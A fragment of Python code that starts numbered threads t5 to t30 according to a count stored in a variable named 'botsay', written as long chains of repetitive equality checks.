if botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t5.start()
if botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t6.start()
if botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t7.start()
if botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t8.start()
if botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t9.start()
if botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t10.start()
if botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t11.start()
if botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t12.start()
if botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t13.start()
if botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t14.start()
if botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t15.start()
if botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t16.start()
if botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t17.start()
if botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t18.start()
if botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t19.start()
if botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t20.start()
if botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t21.start()
if botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t22.start()
if botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t23.start()
if botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t24.start()
if botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t25.start()
if botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t26.start()
if botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t27.start()
if botsay == 28 or botsay == 29 or botsay == 30:
    t28.start()
if botsay == 29 or botsay == 30:
    t29.start()
if botsay == 30:
    t30.start()
